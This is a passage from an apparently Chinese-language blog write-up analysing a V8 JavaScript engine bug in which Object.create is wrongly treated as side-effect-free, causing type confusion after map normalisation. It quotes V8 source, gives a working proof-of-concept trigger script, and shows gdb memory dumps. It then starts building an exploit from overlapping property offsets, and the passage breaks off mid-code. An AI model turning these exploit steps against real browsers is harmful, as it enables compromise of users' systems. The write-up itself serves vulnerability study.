&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看见，如果<code>enable_setup_mode</code>为真，并且<code>PrototypeBenefitsFromNormalization()</code>的返回值也为真的话，将会调用<code> JSObject::NormalizeProperties</code>，其中关于<code>PrototypeBenefitsFromNormalization</code>的判断可以看见，我们的对象需要拥有FastProperties并且满足下面的一些条件即可：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">PrototypeBenefitsFromNormalization</span><span class="params">(Handle&lt;JSObject&gt; object)</span> </span>&#123;</span><br><span class="line">  DisallowHeapAllocation no_gc;</span><br><span class="line">  <span class="keyword">if</span> (!object-&gt;<span class="built_in">HasFastProperties</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (object-&gt;<span class="built_in">IsJSGlobalProxy</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (object-&gt;<span class="built_in">GetIsolate</span>()-&gt;<span class="built_in">bootstrapper</span>()-&gt;<span class="built_in">IsActive</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> !object-&gt;<span class="built_in">map</span>()-&gt;<span class="built_in">is_prototype_map</span>() ||</span><br><span class="line">         !object-&gt;<span class="built_in">map</span>()-&gt;<span class="built_in">should_be_fast_prototype_map</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们继续跟进<code>NormalizeProperties</code>来看看到底发生了什么，源码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">JSObject::NormalizeProperties</span><span class="params">(Handle&lt;JSObject&gt; object,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   PropertyNormalizationMode mode,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="type">int</span> expected_additional_properties,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="type">const</span> <span class="type">char</span>* reason)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!object-&gt;<span class="built_in">HasFastProperties</span>()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">Handle&lt;Map&gt; <span class="title">map</span><span class="params">(object-&gt;map(), object-&gt;GetIsolate())</span></span>;</span><br><span class="line">  Handle&lt;Map&gt; new_map = Map::<span class="built_in">Normalize</span>(object-&gt;<span class="built_in">GetIsolate</span>(), map, mode, reason);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">MigrateToMap</span>(object, new_map, expected_additional_properties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看见，该函数会根据现有的map通过<code>Map::Normalize</code>生成一个新的new_map，那么我们前面讲过，CreateObject被<code>kNoWrite</code>所标记，被认为是不会产生副作用的，但是在这里，如果new_map与map不一致，就会产生副作用，我们继续跟进<code>Map::Normalize</code>看看是否改变了Map：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Handle&lt;Map&gt; <span class="title">Map::Normalize</span><span class="params">(Isolate* isolate, Handle&lt;Map&gt; fast_map,</span></span></span><br><span class="line"><span class="params"><span class="function">                           PropertyNormalizationMode mode, <span class="type">const</span> <span class="type">char</span>* reason)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK</span>(!fast_map-&gt;<span class="built_in">is_dictionary_map</span>());</span><br><span class="line"></span><br><span class="line">  <span class="function">Handle&lt;Object&gt; <span class="title">maybe_cache</span><span class="params">(isolate-&gt;native_context()-&gt;normalized_map_cache(),</span></span></span><br><span class="line"><span class="params"><span class="function">                             isolate)</span></span>;</span><br><span class="line">  <span class="type">bool</span> use_cache =</span><br><span class="line">      !fast_map-&gt;<span class="built_in">is_prototype_map</span>() &amp;&amp; !maybe_cache-&gt;<span class="built_in">IsUndefined</span>(isolate);</span><br><span class="line">  Handle&lt;NormalizedMapCache&gt; cache;</span><br><span class="line">  <span class="keyword">if</span> (use_cache) cache = Handle&lt;NormalizedMapCache&gt;::<span class="built_in">cast</span>(maybe_cache);</span><br><span class="line"></span><br><span class="line">  Handle&lt;Map&gt; new_map;</span><br><span class="line">  <span class="keyword">if</span> (use_cache &amp;&amp; cache-&gt;<span class="built_in">Get</span>(fast_map, mode).<span class="built_in">ToHandle</span>(&amp;new_map)) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> VERIFY_HEAP</span></span><br><span class="line">    <span class="keyword">if</span> (FLAG_verify_heap) new_map-&gt;<span class="built_in">DictionaryMapVerify</span>(isolate);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ENABLE_SLOW_DCHECKS</span></span><br><span class="line">    <span class="keyword">if</span> (FLAG_enable_slow_asserts) &#123;</span><br><span class="line">      <span class="comment">// The cached map should match newly created normalized map bit-by-bit,</span></span><br><span class="line">      <span class="comment">// except for the code cache, which can contain some ICs which can be</span></span><br><span class="line">      <span class="comment">// applied to the shared map, dependent code and weak cell cache.</span></span><br><span class="line">      Handle&lt;Map&gt; fresh = Map::<span class="built_in">CopyNormalized</span>(isolate, fast_map, mode);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (new_map-&gt;<span class="built_in">is_prototype_map</span>()) &#123;</span><br><span class="line">        <span class="comment">// For prototype maps, the PrototypeInfo is not copied.</span></span><br><span class="line">        <span class="built_in">DCHECK_EQ</span>(<span class="number">0</span>, <span class="built_in">memcmp</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(fresh-&gt;<span class="built_in">address</span>()),</span><br><span class="line">                            <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(new_map-&gt;<span class="built_in">address</span>()),</span><br><span class="line">                            kTransitionsOrPrototypeInfoOffset));</span><br><span class="line">        <span class="built_in">DCHECK_EQ</span>(fresh-&gt;<span class="built_in">raw_transitions</span>(),</span><br><span class="line">                  MaybeObject::<span class="built_in">FromObject</span>(Smi::kZero));</span><br><span class="line">        <span class="built_in">STATIC_ASSERT</span>(kDescriptorsOffset ==</span><br><span class="line">                      kTransitionsOrPrototypeInfoOffset + kPointerSize);</span><br><span class="line">        <span class="built_in">DCHECK_EQ</span>(<span class="number">0</span>, <span class="built_in">memcmp</span>(HeapObject::<span class="built_in">RawField</span>(*fresh, kDescriptorsOffset),</span><br><span class="line">                            HeapObject::<span class="built_in">RawField</span>(*new_map, kDescriptorsOffset),</span><br><span class="line">                            kDependentCodeOffset - kDescriptorsOffset));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">DCHECK_EQ</span>(<span class="number">0</span>, <span class="built_in">memcmp</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(fresh-&gt;<span class="built_in">address</span>()),</span><br><span class="line">                            <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(new_map-&gt;<span class="built_in">address</span>()),</span><br><span class="line">                            Map::kDependentCodeOffset));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">STATIC_ASSERT</span>(Map::kPrototypeValidityCellOffset ==</span><br><span class="line">                    Map::kDependentCodeOffset + kPointerSize);</span><br><span class="line">      <span class="type">int</span> offset = Map::kPrototypeValidityCellOffset + kPointerSize;</span><br><span class="line">      <span class="built_in">DCHECK_EQ</span>(<span class="number">0</span>, <span class="built_in">memcmp</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(fresh-&gt;<span class="built_in">address</span>() + offset),</span><br><span class="line">                          <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(new_map-&gt;<span class="built_in">address</span>() + offset),</span><br><span class="line">                          Map::kSize - offset));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    new_map = Map::<span class="built_in">CopyNormalized</span>(isolate, fast_map, mode);</span><br><span class="line">    <span class="keyword">if</span> (use_cache) &#123;</span><br><span class="line">      cache-&gt;<span class="built_in">Set</span>(fast_map, new_map);</span><br><span class="line">      isolate-&gt;<span class="built_in">counters</span>()-&gt;<span class="built_in">maps_normalized</span>()-&gt;<span class="built_in">Increment</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (FLAG_trace_maps) &#123;</span><br><span class="line">      <span class="built_in">LOG</span>(isolate, <span class="built_in">MapEvent</span>(<span class="string">&quot;Normalize&quot;</span>, *fast_map, *new_map, reason));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fast_map-&gt;<span class="built_in">NotifyLeafMapLayoutChange</span>(isolate);</span><br><span class="line">  <span class="keyword">return</span> new_map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当不满足条件：<code>use_cache &amp;&amp; cache-&gt;Get(fast_map, mode).ToHandle(&amp;new_map)</code>时，将会产生新的Map：<code> new_map = Map::CopyNormalized(isolate, fast_map, mode);</code>，这里use_cache我个人猜测应该是检索是否已有的Map，因为在v8中，Map不被使用时，通常不会被直接移除，因为可能会在后面使用，我们继续跟进<code>CopyNormalized</code>，来看看map是否变化：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Handle&lt;Map&gt; <span class="title">Map::CopyNormalized</span><span class="params">(Isolate* isolate, Handle&lt;Map&gt; map,</span></span></span><br><span class="line"><span class="params"><span class="function">                                PropertyNormalizationMode mode)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> new_instance_size = map-&gt;<span class="built_in">instance_size</span>();</span><br><span class="line">  <span class="keyword">if</span> (mode == CLEAR_INOBJECT_PROPERTIES) &#123;</span><br><span class="line">    new_instance_size -= map-&gt;<span class="built_in">GetInObjectProperties</span>() * kPointerSize;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Handle&lt;Map&gt; result = <span class="built_in">RawCopy</span>(</span><br><span class="line">      isolate, map, new_instance_size,</span><br><span class="line">      mode == CLEAR_INOBJECT_PROPERTIES ? <span class="number">0</span> : map-&gt;<span class="built_in">GetInObjectProperties</span>());</span><br><span class="line">  <span class="comment">// Clear the unused_property_fields explicitly as this field should not</span></span><br><span class="line">  <span class="comment">// be accessed for normalized maps.</span></span><br><span class="line">  result-&gt;<span class="built_in">SetInObjectUnusedPropertyFields</span>(<span class="number">0</span>);</span><br><span class="line">  result-&gt;<span class="built_in">set_is_dictionary_map</span>(<span class="literal">true</span>);</span><br><span class="line">  result-&gt;<span class="built_in">set_is_migration_target</span>(<span class="literal">false</span>);</span><br><span class="line">  result-&gt;<span class="built_in">set_may_have_interesting_symbols</span>(<span class="literal">true</span>);</span><br><span class="line">  result-&gt;<span class="built_in">set_construction_counter</span>(kNoSlackTracking);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> VERIFY_HEAP</span></span><br><span class="line">  <span class="keyword">if</span> (FLAG_verify_heap) result-&gt;<span class="built_in">DictionaryMapVerify</span>(isolate);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看见其中调用了RawCopy函数，并且我们可以看见其中存在一个<code>result-&gt;set_is_dictionary_map(true);</code>，我们跟进这个函数去看看：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Map::set_is_dictionary_map</span><span class="params">(<span class="type">bool</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> new_bit_field3 = IsDictionaryMapBit::<span class="built_in">update</span>(<span class="built_in">bit_field3</span>(), value);</span><br><span class="line">  new_bit_field3 = IsUnstableBit::<span class="built_in">update</span>(new_bit_field3, value);</span><br><span class="line">  <span class="built_in">set_bit_field3</span>(new_bit_field3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数调用了Update，将Map更新为<code>dictionary map</code>，那么很显然，CreateObject函数并不是<code>kNoWrite</code>的，那么漏洞为什么会出现也很清楚了：<strong>当调用<code>Object.create</code> 时，然后由于错误的被标识为<code>kNoWrite</code>，并且在优化过程中被替换为<code>CreateObjectWithoutProperties</code>，又由于优化过程中省略了一系列的检查，没有探测到Map的改变，从而导致了漏洞的产生</strong>。</p>
</li>
<li><h2 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h2><p>由于优化过程中，<code>JSCreateObject</code>被认为是<code>kNoWrite</code>的，所以只要我们先访问一次对象的某一个元素，在接下来访问另一次时，将会由于优化省略了<code>CheckMap</code>这一步，导致仍然按照原来的偏移去取值，导致取出的值并不是真正的值，我们可以构造如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//myPoc.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">triggerVul</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    obj.<span class="property">x</span>;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">create</span>(obj);</span><br><span class="line">    <span class="keyword">return</span> obj.<span class="property">y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;x&quot;</span>:<span class="number">11</span>&#125;;</span><br><span class="line">obj.<span class="property">y</span> = <span class="number">22</span>;</span><br><span class="line"><span class="title function_">triggerVul</span>(obj);</span><br><span class="line"><span class="title function_">triggerVul</span>(obj);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">10000</span>;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;x&quot;</span>:<span class="number">11</span>&#125;;</span><br><span class="line">obj.<span class="property">y</span> = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">var</span> result = <span class="title function_">triggerVul</span>(obj);</span><br><span class="line"><span class="keyword">if</span>(result!=<span class="number">22</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[32m[!] Vul has been triggered!\033[0m&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功触发漏洞：</p>
<img src="/posts/f54b4e18/3.png" class=""></li>
</ul>
</li>
<li><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们首先写一段测试代码来观察一下<code>Object.create</code>前后的内存布局：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.js</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>,<span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line">obj.<span class="property">c</span>=<span class="number">11</span>;</span><br><span class="line">obj.<span class="property">d</span>=<span class="number">22</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(obj);</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">create</span>(obj);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(obj);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>使用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">set args --allow-natives-syntax ./test.js</span><br><span class="line">r</span><br></pre></td></tr></table></figure>

<p>这时可以看见obj对象在内存中的布局如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">第一次DebugPrint: </span><br><span class="line">0x1866d7b8e1b1: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x181a3138ca71 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x03ce280846d9 &lt;Object map = 0x181a313822f1&gt;</span><br><span class="line"> - elements: 0x108cb1b82cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x1866d7b8e2c9 &lt;PropertyArray[3]&gt; &#123;</span><br><span class="line">    <span class="comment">#a: 1 (data field 0)</span></span><br><span class="line">    <span class="comment">#b: 2 (data field 1)</span></span><br><span class="line">    <span class="comment">#c: 11 (data field 2) properties[0]</span></span><br><span class="line">    <span class="comment">#d: 22 (data field 3) properties[1]</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">第二次DebugPrint: </span><br><span class="line">0x1866d7b8e1b1: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x181a3138cb11 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]</span><br><span class="line"> - prototype: 0x03ce280846d9 &lt;Object map = 0x181a313822f1&gt;</span><br><span class="line"> - elements: 0x108cb1b82cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x1866d7b8e371 &lt;NameDictionary[53]&gt; &#123;</span><br><span class="line">   <span class="comment">#d: 22 (data, dict_index: 4, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#a: 1 (data, dict_index: 1, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#b: 2 (data, dict_index: 2, attrs: [WEC])</span></span><br><span class="line">   <span class="comment">#c: 11 (data, dict_index: 3, attrs: [WEC])</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里我们可以很清楚的看见map从<code>FastProperties</code>变为了<code>DictionaryProperties</code>，学过基础知识的应该知道<code>FastProperties</code>模式的值，是直接存储在结构体中的，而<code>DictionaryProperties</code>模式的值，则是存储在一张hash表中的，我们可以查看<code>DictionaryProperties</code>模式的内存结构如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1866d7b8e371</span>: [ObjectHashTable]</span><br><span class="line"> - map: <span class="number">0x108cb1b83669</span> &lt;Map&gt;</span><br><span class="line"> - length: <span class="number">53</span></span><br><span class="line"> - elements: <span class="number">4</span></span><br><span class="line"> - deleted: <span class="number">0</span></span><br><span class="line"> - capacity: <span class="number">16</span></span><br><span class="line"> - elements: &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">5</span> -&gt; <span class="number">0</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">0x108cb1b825a1</span> &lt;undefined&gt; -&gt; <span class="number">0x108cb1b825a1</span> &lt;undefined&gt;</span><br><span class="line">           <span class="number">2</span>: <span class="number">0x108cb1b825a1</span> &lt;undefined&gt; -&gt; <span class="number">0x108cb1b825a1</span> &lt;undefined&gt;</span><br><span class="line">           <span class="number">3</span>: <span class="number">0x108cb1b825a1</span> &lt;undefined&gt; -&gt; <span class="number">0x108cb1b825a1</span> &lt;undefined&gt;</span><br><span class="line">           <span class="number">4</span>: <span class="number">0x33fa0db050a1</span> &lt;String[<span class="number">1</span>]: d&gt; -&gt; <span class="number">22</span></span><br><span class="line">           <span class="number">5</span>: <span class="number">1216</span> -&gt; <span class="number">0x03ce280a2991</span> &lt;String[<span class="number">1</span>]: a&gt;</span><br><span class="line">           <span class="number">6</span>: <span class="number">1</span> -&gt; <span class="number">448</span></span><br><span class="line">           <span class="number">7</span>: <span class="number">0x03ce280a29a9</span> &lt;String[<span class="number">1</span>]: b&gt; -&gt; <span class="number">2</span></span><br><span class="line">           <span class="number">8</span>: <span class="number">704</span> -&gt; <span class="number">0x108cb1b825a1</span> &lt;undefined&gt;</span><br><span class="line">           <span class="number">9</span>: <span class="number">0x108cb1b825a1</span> &lt;undefined&gt; -&gt; <span class="number">0x108cb1b825a1</span> &lt;undefined&gt;</span><br><span class="line">          <span class="number">10</span>: <span class="number">0x108cb1b825a1</span> &lt;undefined&gt; -&gt; <span class="number">0x108cb1b825a1</span> &lt;undefined&gt;</span><br><span class="line">          <span class="number">11</span>: <span class="number">0x108cb1b825a1</span> &lt;undefined&gt; -&gt; <span class="number">0x108cb1b825a1</span> &lt;undefined&gt;</span><br><span class="line">          <span class="number">12</span>: <span class="number">0x108cb1b825a1</span> &lt;undefined&gt; -&gt; <span class="number">0x108cb1b825a1</span> &lt;undefined&gt;</span><br><span class="line">          <span class="number">13</span>: <span class="number">0x108cb1b825a1</span> &lt;undefined&gt; -&gt; <span class="number">0x108cb1b825a1</span> &lt;undefined&gt;</span><br><span class="line">          <span class="number">14</span>: <span class="number">0x108cb1b825a1</span> &lt;undefined&gt; -&gt; <span class="number">0x33fa0db068c9</span> &lt;String[<span class="number">1</span>]: c&gt;</span><br><span class="line">          <span class="number">15</span>: <span class="number">11</span> -&gt; <span class="number">960</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看见，hash表的排列是以0x10个字节为单位的，前0x8是名字，后0x8是名字，并且在测试过程中可以发现，由于随机化的影响，hash表每次的排列都是不同的既相同元素的偏移每次都不一样，这里怎么办我们后面再来说。</p>
<p>我们先看一下按照原本的偏移，Properties中存储了c，d两个变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x1866d7b8e2c9-1</span><br><span class="line">0x1866d7b8e2c8:	0x0000108cb1b83899	0x0000000300000000</span><br><span class="line">0x1866d7b8e2d8:	0x0000000b00000000	0x0000001600000000</span><br><span class="line">0x1866d7b8e2e8:	0x0000108cb1b825a1	0x0000108cb1b82341</span><br><span class="line">0x1866d7b8e2f8:	0x0000000e00000000	0x0000000400000000</span><br><span class="line">0x1866d7b8e308:	0x0000108cb1b846f9	0x000003ce280a2991</span><br><span class="line">0x1866d7b8e318:	0x0000014000000000	0x0000000100000000</span><br><span class="line">0x1866d7b8e328:	0x000003ce280a29a9	0x0010054000000000</span><br><span class="line">0x1866d7b8e338:	0x0000000100000000	0x000033fa0db068c9</span><br><span class="line">0x1866d7b8e348:	0x0020094000000000	0x0000000100000000</span><br><span class="line">0x1866d7b8e358:	0x000033fa0db050a1	0x00300d4000000000</span><br></pre></td></tr></table></figure>

<p>可以看见，在0x8和0x10偏移的位置分别放了c，d的值，那么当他转换为hash表存储时，理论上来说，只要数据够多，原来的偏移处，一定会存在一个新的数据，假如新的数据的属性名为x，原来的数据名为y，那么当出现上述情况时，我们对y操作，实际上就是在对x操作，可以达到类型混淆的效果，那么我们通过以下代码创建多个属性并寻找相应的x与y(这段计算x与y的代码，参考自参考文章，因为我的代码不知道为啥一直算不出来)：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">create</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:<span class="number">123</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">30</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;<span class="string">&#x27;b&#x27;</span>+i&#125;</span> = 456-i`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj_array=[];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*function triggerVul(obj)&#123;</span></span><br><span class="line"><span class="comment">    obj.a;</span></span><br><span class="line"><span class="comment">    this.Object.create(obj);</span></span><br><span class="line"><span class="comment">    eval(`</span></span><br><span class="line"><span class="comment">    $&#123;find_obj.map((b) =&gt; `let $&#123;b&#125; = obj.$&#123;b&#125;;`).join(&#x27;\n&#x27;)&#125;</span></span><br><span class="line"><span class="comment">    `);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span 